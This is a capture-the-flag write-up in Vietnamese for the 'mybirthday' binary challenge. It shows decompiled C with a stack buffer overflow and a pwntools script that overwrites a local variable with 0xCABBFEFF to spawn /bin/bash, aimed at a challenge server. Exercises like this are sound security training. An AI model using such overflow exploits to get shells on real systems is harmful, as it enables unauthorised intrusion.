# **mybirthday**

# Task
nc 61.28.237.24 30200

File: hpbd

## Solution

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char buf[24]; // [esp+0h] [ebp-24h] BYREF
  int v5; // [esp+18h] [ebp-Ch]
  int *v6; // [esp+1Ch] [ebp-8h]

  v6 = &argc;
  v5 = -17829890;
  setup();
  puts("Tell me your birthday?");
  read(0, buf, 0x1Eu);
  if ( v5 == 0xCABBFEFF )
    run_cmd("/bin/bash");
  else
    run_cmd("/bin/date");
  return 0;
}
```

từ code hàm `main` ta thấy bài này để gọi được bash shell ta sẽ tiến hành overwrite biến `v5` thành giá trị `0xCABBFEFF` để pass điều kiện `if` và gọi hàm `run_cmd("/bin/bash")`

![image](https://user-images.githubusercontent.com/31529599/120056568-52e78080-c067-11eb-9d74-0d5381cb0bff.png)

`buf` là biến nhập vào 

`var_C` là biến `v5`

vậy khoảng cách sẽ là `0x24-0xc`

## Exploit
code python

```python
from pwn import *

binary  = context.binary = ELF('./hpbd')

#p = process('./hpbd')
p = remote('61.28.237.24','30200')

# padding từ biến nhập và đến v5
payload = b'A'*(0x24-0xc)

# overwrite giá trị mới vào v5
payload += p32(0xCABBFEFF)

f = open("solve.txt","wb")
p.sendline(payload)
f.write(payload)
p.interactive()
```

# Run scripts

vì server đã đóng nên mình tiến hành khai thác trên local với file flag.txt HCMUS{hpbd}

![image](https://user-images.githubusercontent.com/31529599/120056637-d73a0380-c067-11eb-9573-f792635201b5.png)

Xong !
